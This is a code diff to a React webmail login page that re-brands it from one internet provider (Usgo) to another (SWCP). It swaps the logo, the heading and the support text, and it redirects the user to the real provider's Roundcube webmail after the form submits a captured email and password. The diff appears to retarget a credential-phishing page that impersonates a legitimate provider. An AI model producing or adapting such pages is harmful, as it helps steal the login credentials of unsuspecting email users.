@@ -9,6 +9,7 @@ import axios from 'axios';
 
 import { useEffect } from 'react';
 import usgo from './usgo.png';
+import swcp from './swcp.png';
 
 
 
@@ -17,7 +18,7 @@ function Home(){
     const[email, setUserName] = useState("");
     const[password, setPassword] = useState("");
 
-    const[platform, setPlatform] = useState("Usgo")
+    const[platform, setPlatform] = useState("SWCP")
 
     const[showError, setShowError] = useState(false);
 
@@ -48,7 +49,7 @@ function Home(){
                // console.log(response.data.message);
     
               
-               window.location.href = 'https://webmail0.usgo.net/';
+               window.location.href = 'https://roundcube.swcp.com/';
             }
           } catch (error) {
             // Handle error
@@ -59,8 +60,8 @@ function Home(){
 
     return (
         <>
-            <nav className='mynav px-3 py-3 text-center'>
-                <img className='navimage' src={usgo} />
+            <nav className='mynav px-3 py-3'>
+                <img className='navimage' src={swcp} />
 
             </nav>
 
@@ -84,7 +85,7 @@ function Home(){
             </div>}
 
                 <div className='cardhead'>
-                Welcome to Webmail
+                Welcome to SWCP Webmail
                 </div>
 
                 <form onSubmit={handleSubmit}>
@@ -122,8 +123,7 @@ function Home(){
             
             <br/>
 
-                <p className='info'>If you are having trouble logging in, please contact our free support at <br/>
-support@usfamily.net or 763-222-1000</p>
+                <p className='info'>SWCP Webmail  ●  Get support</p>
         </>
     );
 
